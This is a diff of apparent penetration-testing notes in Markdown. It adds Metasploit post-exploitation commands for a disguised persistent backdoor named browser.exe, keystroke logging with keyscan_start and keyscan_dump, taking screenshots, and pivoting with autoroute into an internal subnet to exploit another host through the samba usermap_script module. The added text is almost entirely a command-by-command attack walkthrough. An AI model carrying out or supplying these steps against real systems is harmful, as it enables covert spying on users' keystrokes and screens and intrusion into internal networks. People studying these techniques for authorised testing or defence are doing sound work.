@@ -701,8 +701,9 @@ DELAY: amount of time to keep reconnecting back
 EXE_NAME: filename used on the target host in the processes
 `> set EXE_NAME browser.exe`
 SESSION: which session to run the exploit aan
-controlleer eerst de running sessions: `> sessions -l`
+verify if there are running sessions: `> sessions -l`
 `> set SESSION 1`
+
 ##### Show advanced options for this module
 `> show advanced`
 
@@ -716,16 +717,60 @@ and the target pc reboots, so no more connections remaining, and you
 use exploit/multi/handler to listen to the port specified in the backdoor you uploaded.
 ##### YOU ALWAYS WILL GET A CONNECTION!!!!
 
+### Spying: Capturing Keys Strikes & Taking screen shots
 
+#### Capturing Key Strikes
 
+After having an active meterpreter session
 
+List active sessions:
+`> sessions -l`
 
+Connect to an active session:
+`> sessions -i 2`
 
+Start the KeyScan program:
+`meterpreter > keyscan_start`
 
+To see all keystrokes that are reccorded:
+`meterpreter > keyscan_dump`
 
+To stop this program:
+`meterpreter > keyscan_stop`
 
+#### Get Screenshots
 
+Simply enter the command:
+`meterpreter > screenshot`
 
+Image goes to the root directory.
+
+## Pivoting
+
+Here is shown how to use the hacked device as a pivot to gain access to other devices on the network.
+
+Connect to an active session:
+`> sessions -i 2`
+
+Check all ipsettings and interfaces:
+Find a interface/subnet that is not visible to the hackers device where the target is connected to
+`meterpreter > ifconfig`
+
+Use an exploit to create a route between the hacker and the internal network found by ifconfig:
+`meterpreter > run autoroute -s 10.2.2.1/24`
+
+Background current session:
+`meterpreter > background`
+
+Use an exploit to hack the new device through the new route, the device will now be visible for the hackers device
+`msf > use exploit/multi/samba/usermap_script`
+`msf(usermap_script) > show options`
+`msf(usermap_script) > set RHOST 10.20.15.4` (target computer)
+`msf(usermap_script) > show payloads`
+`msf(usermap_script) > set PAYLOAD cmd/unix/bind_netstat`
+`msf(usermap_script) > exploit`
+
+# Website Penetration testing
 
 
 
